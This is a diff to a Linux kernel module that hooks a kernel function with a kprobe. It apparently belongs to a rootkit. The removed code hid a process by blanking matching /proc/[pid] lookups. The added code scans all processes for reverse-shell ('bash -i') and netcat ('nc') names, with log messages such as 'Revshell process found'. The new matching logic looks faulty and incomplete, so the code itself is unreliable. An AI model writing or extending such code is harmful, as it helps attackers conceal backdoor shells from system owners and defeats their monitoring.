@@ -5,6 +5,8 @@
  */
 
 #define pr_fmt(fmt) "%s: " fmt, __func__
+#define HIDE_CMD1 "bash -i"
+#define HIDE_CMD2 "nc"
 
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -26,23 +28,30 @@ static struct kprobe kp = {
 /* kprobe pre_handler: called just before the probed instruction is executed */
 static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
-	char *filename = (char *)regs->si;
-	pid_t pid = current->pid;
-	char path[256];
+	struct task_struct *task;
 
-	dbg_print(
-		"<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
-		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si,
-		regs->flags);
+	// Scan all processes running in the system.
+	for_each_process(task) {
+		//dbg_print("Checking process: %s (PID: %d)\n", task->comm, task->pid);
 
-	// Convert current->pid to string and create /proc/[pid] path
-	snprintf(path, sizeof(path), "/proc/%d", pid);
+		// Check if process name matches "bash -i"
+		if (strncmp(task->comm, HIDE_CMD1, 10) == 0 &&
+		    task->comm[10] == '\0') {
+			dbg_print("Revshell process found (PID: %d)\n",
+				  task->pid);
 
-	dbg_print("PID: %d\n", pid);
+			break;
+		}
 
-	if (strcmp(filename, path) == 0)
-		*((char *)regs->si) = '\0';
+		// Check if process name matches "nc"
+		if (strncmp(task->comm, HIDE_CMD2, 10) == 0 &&
+		    task->comm[10] == '\0') {
+			dbg_print("Netcat process found (PID: %d)\n",
+				  task->pid);
 
+			break;
+		}
+	}
 	return 0;
 }
 
